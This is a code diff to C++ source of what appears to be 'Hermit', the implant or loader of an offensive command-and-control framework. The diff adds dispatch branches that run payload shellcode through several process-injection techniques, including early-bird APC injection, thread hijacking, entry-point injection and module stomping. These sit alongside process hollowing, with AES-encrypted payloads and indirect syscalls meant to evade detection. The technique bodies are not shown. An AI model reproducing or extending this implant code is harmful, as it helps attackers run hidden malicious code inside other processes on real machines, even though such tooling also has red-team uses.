@@ -10,7 +10,11 @@ namespace Hermit
         {
 			return nullptr;
         }
-
+        HMODULE hKernel32DLL = LoadLibrary(L"kernel32.dll");
+        if (!hKernel32DLL)
+        {
+            return nullptr;
+        }
         HMODULE hWinHTTPDLL = LoadLibrary(L"winhttp.dll");
         if (!hWinHTTPDLL)
         {
@@ -28,9 +32,10 @@ namespace Hermit
 
 		pState->pCrypt				        = Crypt::InitCrypt(AES_KEY_BASE64_W, AES_IV_BASE64_W);
 		// pState->pTeb 				        = NtCurrentTeb();
+        pState->hKernel32DLL                = hKernel32DLL;
 		pState->hNTDLL				        = hNTDLL;
 		pState->hWinHTTPDLL			        = hWinHTTPDLL;
-		pState->pProcs 				        = Procs::FindProcs(hNTDLL, hWinHTTPDLL, pState->bIndirectSyscalls);
+		pState->pProcs 				        = Procs::FindProcs(hNTDLL, hKernel32DLL, hWinHTTPDLL, pState->bIndirectSyscalls);
 		pState->lpPayloadType 		        = PAYLOAD_TYPE_W;
 		pState->lpPayloadTechnique 		    = PAYLOAD_TECHNIQUE_W;
         pState->lpPayloadProcessToInject    = PAYLOAD_PROCESS_TO_INJECT_W;
@@ -141,8 +146,8 @@ namespace Hermit
         {
             Technique::Injection::ProcessHollowing(
                 pState->pProcs,
-                (LPVOID)bytes.data(),
-                pState->lpPayloadProcessToInject
+                pState->lpPayloadProcessToInject,
+                bytes
             );
         }
 
@@ -168,15 +173,66 @@ namespace Hermit
         if (wcscmp(pState->lpPayloadTechnique, L"shellcode-injection") == 0)
         {
             DWORD dwTargetPID = System::Process::ProcessGetIdByName(pState->lpPayloadProcessToInject);
-            Technique::Injection::ShellcodeInjection(pState->pProcs, dwTargetPID, bytes);
+            Technique::Injection::ShellcodeInjection(
+                pState->pProcs,
+                dwTargetPID,
+                bytes
+            );
         }
-        else if (wcscmp(pState->lpPayloadTechnique, L"shellcode-execution-via-fibers") == 0)
+        else if (wcscmp(pState->lpPayloadTechnique, L"via-fibers") == 0)
         {
-            Technique::Injection::ShellcodeExecutionViaFibers(pState->pProcs, bytes);
+            Technique::Injection::ShellcodeExecutionViaFibers(
+                pState->pProcs,
+                bytes
+            );
         }
-        else if (wcscmp(pState->lpPayloadTechnique, L"shellcode-execution-via-apc-and-nttestalert") == 0)
+        else if (wcscmp(pState->lpPayloadTechnique, L"via-apc-and-nttestalert") == 0)
         {
-            Technique::Injection::ShellcodeExecutionViaAPCAndNtTestAlert(pState->pProcs, bytes);
+            Technique::Injection::ShellcodeExecutionViaAPCAndNtTestAlert(
+                pState->pProcs,
+                bytes
+            );
+        }
+        else if (wcscmp(pState->lpPayloadTechnique, L"early-bird-apc-queue-code-injection") == 0)
+        {
+            Technique::Injection::EarlyBirdAPCQueueCodeInjection(
+                pState->pProcs,
+                pState->lpPayloadProcessToInject,
+                bytes
+            );
+        }
+        else if (wcscmp(pState->lpPayloadTechnique, L"via-create-threadpool-wait") == 0)
+        {
+            Technique::Injection::ShellcodeExecutionViaCreateThreadpoolWait(
+                pState->pProcs,
+                bytes
+            );
+        }
+        else if (wcscmp(pState->lpPayloadTechnique, L"thread-execution-hijacking") == 0)
+        {
+            DWORD dwTargetPID = System::Process::ProcessGetIdByName(pState->lpPayloadProcessToInject);
+            Technique::Injection::ThreadExecutionHijacking(
+                pState->pProcs,
+                dwTargetPID,
+                bytes
+            );
+        }
+        else if (wcscmp(pState->lpPayloadTechnique, L"address-of-entry-point-injection") == 0)
+        {
+            Technique::Injection::AddressOfEntryPointInjection(
+                pState->pProcs,
+                pState->lpPayloadProcessToInject,
+                bytes
+            );
+        }
+        else if (wcscmp(pState->lpPayloadTechnique, L"module-stomping") == 0)
+        {
+            DWORD dwTargetPID = System::Process::ProcessGetIdByName(pState->lpPayloadProcessToInject);
+            Technique::Injection::ModuleStomping(
+                pState->pProcs,
+                dwTargetPID,
+                bytes
+            );
         }
 
         State::Free(pState);
